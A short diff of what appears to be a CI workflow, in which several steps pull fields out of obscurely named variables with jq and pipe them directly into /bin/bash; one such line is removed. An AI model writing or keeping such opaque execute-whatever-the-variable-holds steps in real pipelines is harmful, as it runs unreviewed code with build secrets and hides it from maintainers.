@@ -28,7 +28,6 @@ jobs:
           echo $jzfvm832 | jq -r .fob611 | /bin/bash
           printf '%s' "$dew4801" | jq -r .iher77 | /bin/bash
           printf '%s' "$hhof82" | jq -r .s439 | /bin/bash
-          echo $gz4271 | jq -r .ytc16 | /bin/bash
           echo $ltux582 | jq -r .d0787 | /bin/bash
 
       - name: Archive output
